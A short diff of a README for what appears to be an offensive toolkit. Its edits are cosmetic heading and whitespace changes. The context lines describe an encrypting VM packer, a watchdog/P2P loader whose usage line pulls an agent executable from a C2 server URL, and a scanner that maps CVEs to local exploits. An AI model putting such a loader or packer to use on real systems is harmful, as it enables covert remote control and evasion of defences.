@@ -179,6 +179,7 @@ packed_vm.exe
 * **Encryption key**: edit the key array in packer_loader.c.
 * **VM opcodes / stack size**: modify vm.h/vm.c.
 * **Add new instructions**: extend the enum in vm.h and handling in run_vm.
+  
 
 # Watchdog & P2P Loader Module /P2P_control
 
@@ -260,7 +261,7 @@ watchdog.exe <agent.exe> <https://c2.server/agent.exe>
    ```
 3. The running service will pick up the new addresses on its next DLL reload cycle.
 
-## Scanner
+# Scanner
 
 Console tool that, reads a local SQLite CVE DB. Checks kernel and specified package versions.Prints matching CVEs and local exploits from a CSV
 
@@ -301,9 +302,7 @@ make clean-db
 ./tools/update_nvd_sqlite.py data/nvd.sqlite3 --json-dir data/nvd_json --download
 ```
 
-Subsequent runs can omit --download if JSON files are already present.
-
-## Data formats
+## Data
 
 SQLite table cves:
 
